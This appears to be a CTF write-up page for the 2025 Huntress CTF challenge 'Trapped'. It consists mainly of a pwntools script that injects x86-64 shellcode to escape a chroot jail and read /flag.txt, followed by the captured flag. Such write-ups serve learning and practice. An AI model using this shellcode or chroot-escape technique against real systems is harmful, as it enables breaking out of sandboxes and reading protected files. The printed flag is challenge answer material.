@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>2025-10-29 · the-grizzly-bear</title>
+<meta name="description" content="2025-10-29 — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025-huntress-ctf/2025-10-29.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">Huntress CTF</a> &rsaquo; <a href="index.html">2025-Huntress-CTF</a></div>
+<h1 id="title">2025-10-29</h1>
+
+<h1 id="trapped"><strong>⚒️ Trapped</strong></h1>
+<p class="figure"><a class="img-link" href="2025-10-29/image.png"><img src="2025-10-29/image.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>from pwn import *
+
+# Connect to remote
+io = remote('ipaddress', 9999)
+
+# Receive initial prompt
+io.recvuntil(b'Which file would you like to open?\n')
+
+# Send a filename (anything without "flag")
+io.sendline(b'.')
+
+# Wait for shellcode prompt
+io.recvuntil(b'What would you like me to run next?')
+
+# Shellcode to escape chroot and read /flag.txt
+# This uses the classic chroot escape: chdir("..\..") multiple times, then chroot(".")
+shellcode = asm(f'''
+    /* Escape chroot by going up directories */
+    mov rax, 80          /* chdir */
+    lea rdi, [rip+dotdot]
+    syscall
+    
+    /* Repeat many times to escape */
+    {chr(10).join(['mov rax, 80; lea rdi, [rip+dotdot]; syscall'] * 50)}
+    
+    /* chroot to current dir (now outside jail) */
+    mov rax, 161         /* chroot */
+    lea rdi, [rip+dot]
+    syscall
+    
+    /* Open /flag.txt */
+    mov rax, 2           /* open */
+    lea rdi, [rip+flagpath]
+    xor rsi, rsi         /* O_RDONLY */
+    syscall
+    mov r8, rax          /* save fd */
+    
+    /* Read flag */
+    mov rax, 0           /* read */
+    mov rdi, r8
+    lea rsi, [rip+buffer]
+    mov rdx, 100
+    syscall
+    
+    /* Write to stdout */
+    mov rax, 1           /* write */
+    mov rdi, 1
+    lea rsi, [rip+buffer]
+    mov rdx, 100
+    syscall
+    
+    /* Exit */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+    
+dotdot:
+    .asciz ".."
+dot:
+    .asciz "."
+flagpath:
+    .asciz "/flag.txt"
+buffer:
+    .space 100
+''', arch='amd64')
+
+io.send(shellcode)
+
+# Get the flag
+io.interactive()</code></pre>
+<pre><code>flag{5f8c037a7ca4cb89c80174bca5eaf531}</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-29/image-1.png"><img src="2025-10-29/image-1.png" alt="image.png" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
